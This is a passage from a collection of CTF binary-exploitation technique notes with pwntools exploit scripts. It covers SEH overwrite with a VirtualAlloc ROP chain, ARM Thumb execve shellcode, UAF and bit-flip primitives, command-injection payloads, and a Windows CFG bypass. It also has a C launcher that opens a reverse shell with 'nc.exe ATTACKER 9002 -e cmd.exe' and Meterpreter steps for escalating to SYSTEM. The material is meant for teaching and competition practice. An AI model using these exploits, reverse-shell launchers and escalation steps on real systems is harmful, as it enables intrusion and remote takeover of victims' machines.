**When to recognize:** Binary has `read()` but no `write()` or win function. The read primitive lets you both leak values AND place data on the stack. The challenge becomes finding the right source addresses in libc to read from, not constructing gadgets.

**References:** BSidesSF 2026 "readme"

---

### 4-Byte Shellcode with Timing Side-Channel via Persistent Registers (Google CTF 2017)

**Pattern:** When a binary executes only 4 bytes of user shellcode in a 4096-iteration loop, exploit persistent callee-saved registers (r12-r15) to build complex exploits incrementally.

```python
from pwn import *

# Phase 1: Leak stack address via timing (4096x amplification)
# add r12, [rsp] — accumulate stack value into r12
shellcode = asm("add r12, [rsp]")  # 4 bytes
# Timing difference reveals r12 value (large r12 = more loop iterations)

# Phase 2: Write shellcode byte-by-byte to BSS
# mov [r15], r12b — write accumulated byte to target
shellcode = asm("mov [r15], r12b")  # 4 bytes

# Phase 3: Stack pivot via 4-byte gadget
shellcode = asm("push rsp; pop rdi; push r15")  # exactly 4 bytes
```

**Key insight:** Callee-saved registers (r12-r15) persist across the 4096 loop iterations and between separate submissions. The 4096x loop amplifies timing differences enough for reliable side-channel measurement, while iterative register operations build complex state from minimal per-round instructions.

**When to recognize:** Challenge provides a very small shellcode window (4-8 bytes) but executes it in a loop or allows multiple submissions. Check whether callee-saved registers are preserved between iterations.

**References:** Google CTF 2017

---

### CRC Oracle as Arbitrary Read Primitive (ASIS CTF 2017)

**Pattern:** When a service exposes CRC computation on user-controlled data with a pointer overflow, brute-force single-byte CRC results against a 256-entry lookup table to read arbitrary memory.

```python
from pwn import *

CRCLOOKUP = [crc8(bytes([b])) for b in range(256)]  # precompute

def read_byte(addr):
    payload = b"A" * 100 + p32(addr)  # overflow pointer to target address
    crc_result = int(get_crc(1, payload), 16)  # CRC of 1 byte at addr
    return CRCLOOKUP.index(crc_result)  # reverse lookup

def read_dword(addr):
    return sum(read_byte(addr + i) << (i * 8) for i in range(4))

# Chain: leak GOT → libc base → __environ → canary → ROP
got_value = read_dword(elf.got['puts'])
libc_base = got_value - libc.sym['puts']
environ = read_dword(libc_base + libc.sym['__environ'])
canary = read_dword(environ - CANARY_OFFSET)
```

**Key insight:** A CRC function is a bijection on single bytes — each input byte produces a unique CRC. By overflowing a pointer to control the CRC input address and precomputing all 256 single-byte CRCs, each byte of arbitrary memory is recovered via reverse lookup. Chain multiple reads to leak GOT entries, libc base, stack addresses, and canary values.

**When to recognize:** Service computes a checksum or hash on data at a user-influenced address. If the checksum is bijective on single bytes (CRC-8, simple XOR, etc.), it becomes an arbitrary read oracle.

**References:** ASIS CTF 2017

---

### UTF-8 Case Conversion Buffer Overflow (HITB CTF 2017)

**Pattern:** `g_utf8_strup()` (GLib uppercase conversion) can return more bytes than the input when certain multi-byte UTF-8 characters expand during case conversion.

```python
from pwn import *

# \xd6\x87 is a 2-byte UTF-8 char that becomes 4 bytes when uppercased
# 68 such characters: 68 * 2 = 136 input bytes → 68 * 4 = 272 output bytes
# If buffer allocated for input length, output overflows
payload = b"\xd6\x87" * 68 + b"$0;".ljust(8, b" ") + p32(0x400890)
```

**Key insight:** Unicode case conversion can change the byte length of characters. Certain UTF-8 sequences (like U+0587, Armenian small ligature) expand from 2 bytes to 4 bytes when uppercased. If a buffer is sized based on the input length, the longer output overflows it. This affects any code using GLib's `g_utf8_strup()`/`g_utf8_strdown()`, ICU's `u_strToUpper()`, or similar Unicode-aware case conversion functions.

**When to recognize:** Binary performs Unicode case conversion (upper/lower) on user input before copying to a fixed-size buffer. Look for GLib, ICU, or custom UTF-8 processing functions. The overflow ratio depends on the specific characters used.

**References:** HITB CTF 2017

---

See [advanced-exploits.md](advanced-exploits.md) for VM signed comparison, BF JIT shellcode, type confusion, off-by-one index corruption, DNS overflow, ASAN shadow memory, format string with encoding constraints, custom canary preservation, signed integer bypass, CSV injection, MD5 preimage gadgets, VM GC UAF slab reuse, path traversal sanitizer bypass, and FSOP + seccomp bypass.

See [advanced-exploits-2.md](advanced-exploits-2.md) for bytecode validator bypass, io_uring UAF with SQE injection, integer truncation bypass, GC null-reference cascading corruption, leakless libc via multi-fgets, signed/unsigned char underflow with TLS destructor hijack, custom shadow stack bypass, and signed int overflow with XSS-to-binary pwn bridge.


# advanced-exploits-4

# CTF Pwn - Advanced Exploit Techniques (Part 4)

Windows exploitation, ARM shellcode, Forth interpreter exploitation, and GF(2) Gaussian elimination for heap corruption.

## Table of Contents
- [Windows SEH Overwrite + pushad VirtualAlloc ROP (RainbowTwo HTB)](#windows-seh-overwrite--pushad-virtualalloc-rop-rainbowtwo-htb)
- [SeDebugPrivilege to SYSTEM (RainbowTwo HTB)](#sedebugprivilege-to-system-rainbowtwo-htb)
- [ARM Buffer Overflow with Thumb Shellcode (HackIM 2016)](#arm-buffer-overflow-with-thumb-shellcode-hackim-2016)
- [Forth Interpreter Command Execution (32C3 2015)](#forth-interpreter-command-execution-32c3-2015)
- [GF(2) Gaussian Elimination for Multi-Pass Tcache Poisoning (Midnight Flag 2026)](#gf2-gaussian-elimination-for-multi-pass-tcache-poisoning-midnight-flag-2026)
- [Single-Bit-Flip Exploitation Primitive (PlaidCTF 2016)](#single-bit-flip-exploitation-primitive-plaidctf-2016)
- [Game of Life Shellcode Evolution via Still-Lifes (DEF CON Quals 2016)](#game-of-life-shellcode-evolution-via-still-lifes-def-con-quals-2016)
- [UAF via Menu-Driven strdup/free Ordering (PlaidCTF 2016)](#uaf-via-menu-driven-strdupfree-ordering-plaidctf-2016)
- [mmap/munmap Size Mismatch UAF for Thread Stack Overlap (0CTF 2017)](#mmapmunmap-size-mismatch-uaf-for-thread-stack-overlap-0ctf-2017)
- [Premature Global Index Update for Out-of-Bounds Stack Write (BKP 2017)](#premature-global-index-update-for-out-of-bounds-stack-write-bkp-2017)
- [strcspn as Indirect Null Byte Injection (BSidesSF 2017)](#strcspn-as-indirect-null-byte-injection-bsidessf-2017)
- [Windows CFG Bypass Using system() as Valid Call Target (Insomni'hack 2017)](#windows-cfg-bypass-using-system-as-valid-call-target-insomnihack-2017)

---

## Windows SEH Overwrite + pushad VirtualAlloc ROP (RainbowTwo HTB)

**Pattern:** 32-bit Windows PE (Portable Executable) with ASLR (Address Space Layout Randomization), DEP (Data Execution Prevention), and GS (stack cookie) enabled but SafeSEH disabled. Combine format string leak (defeats ASLR) with SEH-based (Structured Exception Handler) buffer overflow using VirtualAlloc ROP chain to bypass DEP.

**Attack chain:**
1. **Format string leak defeats ASLR:** User input used as printf format string leaks code pointer at position 2: `LST %p-%p-%p-%p-%p` -> `binary_base = int(leaks[1], 16) - 0x14120`
2. **Buffer overflow triggers SEH:** `sprintf("Path: %s", user_path)` into 1024-byte buffer overflows into SEH handler chain
3. **Stack pivot via SEH handler:** `add esp, 0xe10; ret` redirects from exception context into ROP chain
4. **Ret-slide absorbs crash variation:** 30x `ret` gadgets at start of ROP chain absorb variable crash offset
5. **pushad VirtualAlloc technique:** Set all 8 registers to correct values, then `pushad` builds the entire `VirtualAlloc(lpAddress, dwSize=1, flAllocationType=0x1000, flProtect=0x40)` call frame in one instruction
6. **IAT-relative function resolution:** `VirtualAlloc` not in IAT (Import Address Table), but `TlsAlloc` is. Read `[TlsAlloc@IAT]`, add offset to get `VirtualAlloc` address -- offset calculated from provided `kernel32.dll`
7. **jmp esp to shellcode:** After VirtualAlloc marks stack RWX (Read-Write-Execute), `jmp esp` executes shellcode that follows

```python
# Key ROP chain structure (simplified)
rop  = p32(base + RET) * 30              # ret-slide for stability

# Set flProtect = 0x40 (PAGE_EXECUTE_READWRITE) via subtraction (avoid nulls)
rop += p32(base + POP_EAX) + p32(0x8314c2ab)
rop += p32(base + SUB_EAX)               # sub eax, 0x8314c26b -> eax = 0x40

# Resolve VirtualAlloc: [TlsAlloc@IAT] + offset
rop += p32(base + POP_EAX) + p32(base + TLSALLOC_IAT)
rop += p32(base + MOV_EAX_DEREF_EAX)     # eax = TlsAlloc address
rop += p32(base + ADD_EAX_EDI)           # eax = VirtualAlloc address

# pushad builds call frame, jmp esp runs shellcode
rop += p32(base + PUSHAD_RET)
rop += p32(base + JMP_ESP)
```

**Bad characters for shellcode:** `\x00` (sprintf null), `\x09-\x0d` (whitespace), `\x20` (space), `\x25` (% triggers format string). Encode with msfvenom's shikata_ga_nai to avoid these bytes.

**Detached process for shell stability:** When exploiting thread-based servers, child processes die with the parent thread. Compile a launcher with `CREATE_NEW_PROCESS_GROUP | DETACHED_PROCESS` flags:
```c
// i686-w64-mingw32-gcc launcher.c -o launcher.exe -static
#include <windows.h>
int main() {
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    CreateProcessA(NULL, "C:\\shared\\nc.exe ATTACKER 9002 -e cmd.exe",
        NULL, NULL, FALSE,
        CREATE_NEW_PROCESS_GROUP | DETACHED_PROCESS | CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi);
    return 0;
}
```

**Key insight:** `pushad` pushes all 8 general-purpose registers (EDI, ESI, EBP, ESP, EBX, EDX, ECX, EAX) onto the stack in one instruction. By pre-loading each register with the correct value, `pushad` builds the entire STDCALL function call frame in the exact order Windows expects. This avoids the need for `mov [esp+N], reg` gadgets which are rare.

---

## SeDebugPrivilege to SYSTEM (RainbowTwo HTB)

Exploits `SeDebugPrivilege` to escalate to SYSTEM by migrating into a SYSTEM-owned process. The privilege allows debugging any process, even if listed as "Disabled" -- Meterpreter enables it automatically before use.

**Steps:**
1. Upload Meterpreter payload and obtain a session
2. Migrate into a SYSTEM-level process:
```text
meterpreter > migrate -N winlogon.exe
meterpreter > getuid
# NT AUTHORITY\SYSTEM
```

Meterpreter's `migrate` injects a DLL into the target process (`winlogon.exe`, `lsass.exe`), running code as that process's user (SYSTEM).

**Detection:** `whoami /priv` shows `SeDebugPrivilege`. Common on service accounts and `NT AUTHORITY\SERVICE`.

**Key insight:** Always run `whoami /priv` after landing a Windows shell. `SeDebugPrivilege` -- even when shown as "Disabled" -- is a direct path to SYSTEM via process migration.

---

## ARM Buffer Overflow with Thumb Shellcode (HackIM 2016)

ARM exploitation differs from x86 in several key ways:

1. **Register conventions:** PC (program counter) instead of EIP; LR (link register) for return addresses
2. **Thumb mode:** Set bit 0 of target address to 1 to switch to Thumb (16-bit) instructions, which avoids null bytes more easily
3. **Syscall numbers:** Different from x86 (`execve` = 11, `dup2` = 63)

Socket-based ARM Thumb shellcode (dup2 + execve):

```asm
.syntax unified
.thumb
dup2_loop:
    mov  r1, r6          @ socket fd (leaked or known)
    mov  r0, #0          @ stderr=0, increment for stdout, stdin
    movs r7, #0x3f       @ __NR_dup2 = 63
    svc  #1
    add  r0, #1
    cmp  r0, #3
    blt  dup2_loop

execve:
    adr  r0, shell
    eor  r1, r1          @ argv = NULL
    eor  r2, r2          @ envp = NULL
    movs r7, #0xb        @ __NR_execve = 11
    svc  #1

shell: .ascii "/bin/sh\x00"
```

Cross-compile and test with QEMU:

```bash
arm-linux-gnueabi-as -mthumb -o sc.o shellcode.s
arm-linux-gnueabi-ld -o sc sc.o
qemu-arm -g 1234 ./sc  # Debug with gdb-multiarch
```

**Key insight:** Use `qemu-arm` for local testing and `gdb-multiarch` for debugging. Statically-linked ARM binaries contain all gadgets needed for ROP without library dependencies.

---

## Forth Interpreter Command Execution (32C3 2015)

Forth interpreters may expose a `system` word that executes shell commands. When interacting with a Forth-based service:

```forth
s" cat /flag" system
s" ls -la" system
s" /bin/sh" system
```

The `s"` word pushes a string address and length onto the stack; `system` pops them and executes via the shell. Check for other dangerous words: `included` (file inclusion), `open-file`, `read-file`.

---

## GF(2) Gaussian Elimination for Multi-Pass Tcache Poisoning (Midnight Flag 2026)

When a binary applies a deterministic XOR cipher to heap data (corrupting adjacent tcache `fd` pointers as a side effect), and each cipher seed produces a different XOR keystream at the fd offset, model the corruption as a linear algebra problem over GF(2) to find exactly which seeds transform the fd to a target address.

**Problem formulation:** Given current fd value `C` and target `T`, compute delta `D = C ^ T`. Each seed `i` produces a 64-bit XOR vector `v_i` at the fd offset. Find a subset `S` of seeds where `XOR(v_i for i in S) == D`.

```python
def find_subset_xor(vectors, target):
    """Find subset of 64-bit vectors that XOR to target via GF(2) Gaussian elimination"""
    n = len(vectors)
    basis = {}  # bit_position -> (vector_value, set_of_contributing_indices)

    for i, v in enumerate(vectors):
        mask = frozenset([i])
        val = v
        for bit in range(63, -1, -1):
            if not (val >> bit) & 1:
                continue
            if bit in basis:
                val ^= basis[bit][0]
                mask = mask.symmetric_difference(basis[bit][1])
            else:
                basis[bit] = (val, mask)
                break

    # Solve for target
    result = frozenset()
    val = target
    for bit in range(63, -1, -1):
        if (val >> bit) & 1:
            if bit not in basis:
                raise ValueError("Target not in span")
            val ^= basis[bit][0]
            result = result.symmetric_difference(basis[bit][1])
    return result

# Precompute XOR vectors: run cipher with each seed, extract 8 bytes at fd offset
vectors = {}
for seed in range(10000):
    keystream = djb2_cipher(seed, length=0x90)
    xor_at_fd = u64(keystream[0x88:0x90])  # fd is at offset 0x88 in chunk
    vectors[seed] = xor_at_fd

# Compute target delta (safe-linking aware)
current_fd = leaked_fd  # From heap over-read
target_fd = (io_list_all - 0x10) ^ (chunk_addr >> 12)  # Mangled target
delta = current_fd ^ target_fd

seeds_to_apply = find_subset_xor(vectors, delta)
# Apply each seed sequentially -- order doesn't matter (XOR is commutative)
for seed in seeds_to_apply:
    apply_cipher(chunk_idx, seed)
```

Typical result: ~30-35 seeds from a 10,000-seed space. Each application XORs one vector into the fd, cumulatively producing the exact target.

**Key insight:** Any deterministic byte-level transformation of heap metadata can be modeled as GF(2) linear algebra when the operation is XOR. This generalizes beyond specific cipher implementations -- it applies whenever you can repeatedly XOR predictable patterns into a target value.

---

## Single-Bit-Flip Exploitation Primitive (PlaidCTF 2016)

**Pattern (butterfly):** Binary accepts an integer, computes `address = input >> 3` and `bit = input & 7`, then flips `*address ^= (1 << bit)` after making the page RWX via `mprotect`. Single bit flip per invocation, but chaining multiple flips builds arbitrary code.

**Exploitation strategy:**

1. **Create a loop:** Flip a bit in the function epilogue `add rsp, 0x48` to `add rsp, 0x08`, causing stack misalignment that reuses buffer contents as return address. Set return address to function start for repeated invocations:
```python
# Flip bit 6 at address 0x400863 to change 0x48 -> 0x08
cosmic_ray = (0x400863 << 3) | 6  # = 33571614
```

2. **Craft `jmp rsp`:** Flip one bit of an existing `jmp rax` instruction (0xFF 0xE0) to `jmp rsp` (0xFF 0xE4):
```python
cosmic_ray = (0x4006E6 << 3) | 2  # = 33568562
```

3. **Disable stack canary check:** Flip the conditional jump (`jnz`) at the canary check to a non-branching instruction:
```python
# 0x75 (jnz) ^ 0x40 = 0x35 (xor eax, imm32)
cosmic_ray = (0x40085B << 3) | 6
```

4. **Expand input buffer:** Flip a bit in the `fgets` size argument to read more bytes for shellcode

5. **Make stack RWX:** Flip `mov r15, rbp` to `mov r15, rsp` so `mprotect` targets the stack

6. **Inject shellcode** on the now-RWX stack, return to `jmp rsp`

**Alternative approach:** XOR shellcode with existing `.text` bytes, compute which bits differ, flip each one, then redirect execution to the shellcode location.

**Key insight:** A single-bit-flip primitive becomes arbitrary code execution through cumulative modifications. Each flip changes one instruction or operand, and returning to the function start enables unlimited flips. Priority targets: (a) stack unwinding instructions (control flow hijack), (b) existing branch instructions (bypass security checks), (c) `mprotect` arguments (change memory permissions), (d) size parameters (expand read buffers).

---

## Game of Life Shellcode Evolution via Still-Lifes (DEF CON Quals 2016)

**Pattern (b3s23):** Binary reads coordinates for Conway's Game of Life cells on a 110x110 grid, runs 15 iterations, then executes the grid data as machine code. Construct a board that remains stable through 15 iterations while containing valid x86 shellcode.

**Approach — static shellcode rows:**

1. Place x86 instructions in specific rows of the grid
2. Use Game of Life "still-life" patterns (stable configurations) on surrounding rows to keep the shellcode rows unchanged through all iterations
3. Connect shellcode rows with `JMP` instructions to skip non-code rows

```text
Row N-1: still-life border pattern (keeps row N stable)
Row N:   >  shellcode bytes  | JMP to next row
Row N+1: still-life border pattern
Row N+2: (empty or border)
```

**Shellcode constraints:**
- Avoid 5+ consecutive 1-bits (no small still-life can stabilize these)
- Use `add al, 0` (0x04 0x00) as NOP separator between instructions (all bits off)
- Adjacent "wall" patterns (vertical columns of 1s) must match at boundaries
- Two columns of 0s between patterns prevents interference

**Useful still-life patterns for embedding:**
```text
Block:    xx     Snake:  xx x
          xx             x xx
```

```python
# Convert board to coordinates and feed to binary
import re
from pwn import *

rows = open('board.txt').read().split('\n')
coords = []
for y, row in enumerate(rows):
    for m in re.finditer('x', row):
        coords.append((m.start(), y))

p = process('./b3s23')
for x, y in coords:
    p.sendline(f'{x},{y}')
p.sendline('done')
p.interactive()
```

**Key insight:** Game of Life still-lifes are patterns unchanged by the update rules. By embedding shellcode in rows surrounded by still-life borders, the code survives all iterations. The simplest strategy is to `read()` real shellcode onto the grid after gaining execution, avoiding complex Game of Life-aware instruction encoding.

---

## UAF via Menu-Driven strdup/free Ordering (PlaidCTF 2016)

**Pattern (unix_time_formatter):** Menu-driven binary uses `strdup()` to allocate user input (format string, timezone) and `free()` on exit. Exit option frees allocations but asks "Are you sure?" — answering "no" returns to the menu with dangling pointers. New allocations via `strdup()` reuse the freed memory.

**Exploitation:**

1. Set format string (validated for safe characters: `%aAbBcC...`)
2. Set timezone (no input validation)
3. Choose exit → both pointers freed, but answering "no" continues
4. Set timezone twice — second `strdup()` reuses the format string's freed allocation
5. Format string pointer now points to attacker-controlled timezone data
6. "Print time" executes `system("/bin/date -d @TIME +'FORMAT'")` with injected format:

```python
from pwn import *

p = remote('target', 9999)
p.sendlineafter('>', '1')      # Set format
p.sendlineafter('Format:', '%c')
p.sendlineafter('>', '3')      # Set timezone
p.sendlineafter('zone:', "';/bin/sh #\\")
p.sendlineafter('>', '5')      # Exit (frees both)
p.sendlineafter('(y/N)?', 'n') # Don't actually exit
p.sendlineafter('>', '3')      # Reallocate into freed format slot
p.sendlineafter('zone:', "';/bin/sh #\\")
p.sendlineafter('>', '3')      # Second alloc gets other freed slot
p.sendlineafter('zone:', "';/bin/sh #\\")
p.sendlineafter('>', '4')      # Print → shell
p.interactive()
```

**Key insight:** `strdup()` uses `malloc()` internally, so freed `strdup` buffers enter the malloc freelist and are reused by subsequent `strdup()` calls of similar size. When the "exit" path frees memory but allows returning to the menu, any field with strict input validation (format) can be overwritten via a field without validation (timezone) through UAF freelist reuse. The `system()` call then executes the unvalidated content.

---

## mmap/munmap Size Mismatch UAF for Thread Stack Overlap (0CTF 2017)

**Pattern (UploadCenter):** A PNG upload service uses `mmap(width*height)` for image storage but `munmap(compressed_length)` to free it. When compressed length exceeds image dimensions, `munmap` frees more memory than was mapped, unmapping adjacent regions. Chain: (1) upload large PNG so its mmap lands adjacent to a global output buffer; (2) delete PNG — munmap frees both the image AND the output buffer; (3) spawn a thread — `pthread_create` mmaps a stack into the freed gap, overlapping the still-referenced output buffer; (4) upload new PNG — decompressed data written through the output buffer overwrites the thread's stack for ROP.

```python
# Trigger: allocation uses image dimensions, deallocation uses compressed size
# img = mmap(0, width*height, ...)      # small allocation
# pngobj->length = compressed_length     # larger than width*height
# munmap(pngobj->content, pngobj->length) # OVER-UNMAP!

# Exploit chain:
upload_png(large_png)        # mmap lands near global output buffer
delete_png()                 # munmap frees output buffer region too
start_monitor()              # pthread_create mmaps stack into freed gap
upload_rop_png(rop_payload)  # decompress writes through output buf -> thread stack
```

**Key insight:** The mmap/munmap size mismatch creates an "over-unmap" that silently destroys adjacent mappings. When a new thread's stack fills the gap, the old buffer pointer becomes a write-what-where into the thread's stack frame. This is a race-free UAF variant that doesn't require heap metadata corruption.

---

## Premature Global Index Update for Out-of-Bounds Stack Write (BKP 2017)

**Pattern (memo):** The `new_memo` function stores the user-supplied memo index into a global variable *before* validating bounds. The allocation is rejected for out-of-bounds values, but the global `last_memo` retains the invalid index. The `edit_memo` function uses `last_memo` without bounds checking, and the program stores stack pointers at indices 5-9 of the array during `new_memo`. Setting `last_memo=6` causes `edit_memo` to write through a stack address, enabling direct stack overwrites.

```python
# Bug: global index set BEFORE bounds check
# new_memo:
#   last_memo = user_index     # stored here
#   if user_index > 4: reject  # checked too late
#   memos[user_index + 5] = &stack_local  # stack addr in array!

# Exploit:
new_memo(6)      # rejected, but last_memo = 6
# memos[11] = stack pointer from new_memo's frame
edit_memo(payload)  # writes through memos[6] which IS a stack address
# payload overwrites return address -> hidden shellcode executor function
```

**Key insight:** TOCTOU-style vulnerability in a single function — the index is committed to global state before validation rejects it. Combined with the program storing stack addresses in the same array, this turns an invalid index into a direct stack write primitive. Look for patterns where global state is updated before error checking.

---

## strcspn as Indirect Null Byte Injection (BSidesSF 2017)

**Pattern (Steel Mountain: Sensors):** A CGI binary constructs filenames via `snprintf("sensors/%s.cfg", input)`. Direct null byte injection is blocked by the CGI library. After snprintf, `strcspn(buf, "\r\n")` is called and the result index is used to write a null byte (terminating at the first newline). Injecting `%0A` (URL-encoded newline) after the desired filename causes: `sensors/../flag.txt\n.cfg` → null byte written at the `\n` position → `sensors/../flag.txt\0.cfg`, truncating the `.cfg` extension.

```bash
# Request: sensor=../flag.txt%0A&debug
# snprintf produces: "sensors/../flag.txt\n.cfg"
# strcspn("sensors/../flag.txt\n.cfg", "\r\n") = 23
# buf[23] = '\0'
# Result: "sensors/../flag.txt" (null-terminated, .cfg removed)
# -> reads /flag.txt via path traversal
```

**Key insight:** `strcspn` followed by null-byte write is a common C pattern for line termination. When user input reaches this code path with injected newlines, it becomes an indirect null byte injection vector — even when direct null bytes are filtered by the input layer (CGI, HTTP).

---

## Windows CFG Bypass Using system() as Valid Call Target (Insomni'hack 2017)

**Pattern:** Windows Control Flow Guard (CFG) validates indirect call targets at runtime, but `system()` from msvcrt is a valid CFG target, enabling exploitation via function pointer overwrite.

```python
from pwn import *

# On Windows with CFG, overwrite function pointer with system()
# system() is a valid call target in CFG bitmap — it's a legitimate API entry point
# CFG only validates that the target is a valid function start, not WHICH function

# If input filter blocks space (0x20), use comma as argument separator
# cmd.exe treats comma as equivalent to space in argument lists
payload = b"type,flag.txt&whoami^/all\x00"
# 'type,flag.txt' works because cmd.exe treats comma as argument separator
# ^ escapes the / character
# & chains commands

# Exploit chain:
# 1. Leak module base (defeat ASLR)
# 2. Find system() address via IAT or known offset in msvcrt
system_addr = msvcrt_base + system_offset

# 3. Overwrite a function pointer (vtable entry, callback, etc.)
write_addr(vtable_entry, system_addr)

# 4. Trigger the indirect call with controlled first argument
# The overwritten pointer now calls system(attacker_string)
trigger_call(payload)
```

```c
// Alternative: if building a local exploit, bypass character filters
// Comma replaces space, ^ escapes special chars
// system("type,flag.txt") == system("type flag.txt")
// system("cmd,/c,dir") == system("cmd /c dir")
```

**Key insight:** CFG only validates that the target is a valid function entry point -- it does not restrict which function is called. Since `system()` is a legitimate API exported by msvcrt, it passes CFG validation. Use comma instead of space and `^` for escaping when the input filter restricts certain characters. This applies to any Windows binary with CFG where you can overwrite an indirect call target.

**When to recognize:** Windows binary with CFG enabled (check with `dumpbin /headers` or `winchecksec`). Look for writable function pointers (vtables, callbacks, C++ objects) that are called via indirect `call [reg]` instructions. CFG prevents jumping to arbitrary code but allows calling any valid function.

**References:** Insomni'hack 2017

---

See [advanced-exploits.md](advanced-exploits.md) for VM signed comparison, BF JIT shellcode, type confusion, ASAN shadow memory, format string with encoding constraints, MD5 preimage gadgets, VM GC UAF, FSOP + seccomp bypass, and stack variable overlap techniques.

See [rop-advanced.md](rop-advanced.md) for `.fini_array` hijack details.

See [sandbox-escape.md](sandbox-escape.md) for shell tricks and restricted environment techniques.


# advanced-exploits

# CTF Pwn - Advanced Exploit Techniques

## Table of Contents
- [VM Signed Comparison Bug (0xFun 2026)](#vm-signed-comparison-bug-0xfun-2026)
- [BF JIT Unbalanced Bracket to RWX Shellcode (VuwCTF 2025)](#bf-jit-unbalanced-bracket-to-rwx-shellcode-vuwctf-2025)
- [Type Confusion in Interpreter (VuwCTF 2025)](#type-confusion-in-interpreter-vuwctf-2025)
- [Off-by-One Index to Size Corruption (VuwCTF 2025)](#off-by-one-index-to-size-corruption-vuwctf-2025)
- [Double win() Call Pattern (VuwCTF 2025)](#double-win-call-pattern-vuwctf-2025)
- [DNS Record Buffer Overflow](#dns-record-buffer-overflow)
- [ASAN Shadow Memory Exploitation](#asan-shadow-memory-exploitation)
- [Format String with Encoding Constraints + RWX .fini_array Hijack](#format-string-with-encoding-constraints--rwx-fini_array-hijack)
- [Custom Canary Preservation](#custom-canary-preservation)
- [Integer Truncation via Order of Operations (CSAW 2015)](#integer-truncation-via-order-of-operations-csaw-2015)
- [Signed Integer Bypass (Negative Quantity)](#signed-integer-bypass-negative-quantity)
- [Canary-Aware Partial Overflow](#canary-aware-partial-overflow)
- [Global Buffer Overflow (CSV Injection)](#global-buffer-overflow-csv-injection)
- [MD5 Preimage Gadget Construction](#md5-preimage-gadget-construction)
- [VM GC-Triggered UAF — Slab Reuse (EHAX 2026)](#vm-gc-triggered-uaf--slab-reuse-ehax-2026)
- [Path Traversal Sanitizer Bypass](#path-traversal-sanitizer-bypass)
- [Timing Attack for Character-by-Character Flag Recovery (RC3 CTF 2016)](#timing-attack-for-character-by-character-flag-recovery-rc3-ctf-2016)
- [FSOP + Seccomp Bypass via openat/mmap/write (EHAX 2026)](#fsop--seccomp-bypass-via-openatmmapwrite-ehax-2026)
- [Motorola 68000 (m68k) Two-Stage Shellcode (HackIT 2017)](#motorola-68000-m68k-two-stage-shellcode-hackit-2017)
- [DOS COM Real Mode Shellcode (SEC-T CTF 2017)](#dos-com-real-mode-shellcode-sec-t-ctf-2017)
- [Seccomp BPF X-Register Addressing Mode Bypass (HITCON 2017)](#seccomp-bpf-x-register-addressing-mode-bypass-hitcon-2017)
- [Custom Printf Format Specifier Arginfo Overwrite (Hack.lu 2017)](#custom-printf-format-specifier-arginfo-overwrite-hacklu-2017)

---

## VM Signed Comparison Bug (0xFun 2026)

**Pattern (CHAOS ENGINE):** Custom VM STORE opcode checks `offset <= 0xfff` with signed `jle` but no lower bound check.

**Exploit:**
1. Negative offsets reach function pointer table below data area
2. Build values byte-by-byte in VM memory using VM arithmetic
3. LOAD as qwords, compute negative offsets via XOR with 0xFF..FF
4. Overwrite HALT handler with `system@plt`
5. Trigger HALT with "sh" string pointer as argument

**General lesson:** Signed vs unsigned comparison bugs in custom VMs are common. Always check bounds in both directions. Function pointer tables near data buffers = easy RCE.

---

## BF JIT Unbalanced Bracket to RWX Shellcode (VuwCTF 2025)

**Pattern (Blazingly Fast Memory Unsafe):** BF JIT compiler uses stack for `[`/`]` control flow. Unbalanced `]` pops values from prologue.

**Vulnerability:** `]` (LOOP_END) pops return address from stack. Without matching `[`, it pops the **tape address** which resides in **RWX memory**.

**Exploit:**
```python
# Stage 1: Write shellcode to tape via BF +/- operations, then trigger ]
# Use - for bytes >127 (0xff = 1 decrement vs 255 increments)
stage1 = b''
# Build read(0, tape, 256) shellcode on tape
shellcode_bytes = asm(shellcraft.read(0, 'r14', 256))
for byte in shellcode_bytes:
    if byte <= 127:
        stage1 += b'+' * byte + b'>'
    else:
        stage1 += b'-' * (256 - byte) + b'>'
stage1 += b']'  # Unbalanced ] jumps to tape (RWX)

# Stage 2: Send full execve("/bin/sh") shellcode via stdin after Stage 1 runs
```

**Identification:** JIT compilers using stack for bracket matching + RWX tape memory.

---

## Type Confusion in Interpreter (VuwCTF 2025)

**Pattern (Idempotence):** Lambda calculus interpreter's `simplify_normal_order()` unconditionally sets function type to ABS (abstraction), even when it's a VAR (variable).

**Key insight:** VAR's unused bytes 16-23 get interpreted as body pointer. When `print_expression()` encounters type > 2, it dumps raw bytes as UNKNOWN_DATA — flag bytes interpreted as type value trigger the dump.

**General lesson:** Type confusion in interpreters occurs when type tags aren't validated before downcasting. Unused padding bytes in one variant become active fields in another.

---

## Off-by-One Index to Size Corruption (VuwCTF 2025)

**Pattern (Kiwiphone):** Index 0 writes to `entries[-1]`, overlapping a struct's `size` field.

**Exploit chain:**
1. Write to index 0 with crafted data to set `phonebook.size = 48` (normally 16)
2. `print_all` now dumps 48 entries, leaking stack canary, saved RBP, and libc return address
3. Calculate libc base from leaked return address
4. Write ROP chain into entries 17-22: `[canary] [rbp] [ret] [pop_rdi] [/bin/sh] [system]`
5. Exit with -1 to trigger return through ROP chain

**Format trick:** Phone format `+48 0 0-0` doubles as valid phone number AND size overwrite value.

---

## Double win() Call Pattern (VuwCTF 2025)

**Pattern (Tokaid):** `win()` has `if (attempts++ > 0)` check — first call increments from 0 (fails), second call succeeds.

**Payload:** Stack two return addresses: `b'A'*offset + p64(win) + p64(win)`

**PIE calculation:** When main address is leaked: `base = main_leak - main_offset; win = base + win_offset`.

---

## DNS Record Buffer Overflow

**Pattern (Do Not Strike The Clouds):** Many AAAA records overflow stack buffer in DNS response parser.

**Exploitation:**
1. Set up DNS server returning excessive AAAA records
2. Target binary queries DNS, copies records into fixed-size stack buffer
3. Many records overflow into return address
4. Overwrite with win function address

## ASAN Shadow Memory Exploitation

**Pattern (Asan-Bazar, Nullcon 2026):** Binary compiled with AddressSanitizer has format string + OOB write vulnerabilities.

**ASAN Shadow Byte Layout:**
| Shadow Value | Meaning |
|-------------|---------|
| `0x00` | Fully accessible (8 bytes) |
| `0x01-0x07` | Partially accessible (1-7 bytes) |
| `0xF1` | Stack left redzone |
| `0xF3` | Stack right redzone |
| `0xF5` | Stack use after return |

**Key Insight:** ASAN may use a "fake stack" (50% chance) — areas past the ASAN frame have shadow `0x00` on the real stack but different on the fake stack. Detect which by leaking the return address offset.

**Exploitation Pattern:**
```python
# 1. Leak PIE base via format string
payload = b'%8$p'  # Code pointer at known offset
pie_base = leaked - known_offset

# 2. Detect real vs fake stack
# Real stack: return address at known offset from format string buffer
# Check if leaked return address matches expected function offset
